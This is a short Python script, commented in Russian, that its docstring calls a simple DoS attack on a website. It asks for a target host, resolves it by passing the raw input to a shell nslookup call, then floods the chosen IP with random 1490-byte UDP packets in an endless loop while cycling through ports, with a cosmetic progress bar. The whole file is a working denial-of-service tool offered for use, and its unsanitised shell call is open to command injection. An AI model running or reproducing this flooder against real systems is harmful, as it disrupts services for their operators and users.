"""
простая dos атака на сайт
~100_000 пакетов за 20s
"""
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
web = input("Target website: ")
print(os.system(f"nslookup {web}"))

# www.webscantest.com
ip = input("\033[94m[*] \033[91mIP \033[91mTarget \033[97m>>> \033[93m ")
# 53
port = int(input("\033[94m[*] \033[91mPORT \033[97m>>> \033[93m "))

os.system("clear")
print("Подготовка к атаке")
print(" ======D     15% "); time.sleep(1)
print(" =============D      25% "); time.sleep(1)
print(" ====================D       50% "); time.sleep(1)
print(" =============================D        75% "); time.sleep(2)
print(" =====================================D     100% "); time.sleep(1)
os.system("clear")

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print("Отправлен %s пакет в %s через порт %s" % (sent, ip, port))
    if port == 65534:
        port = 1
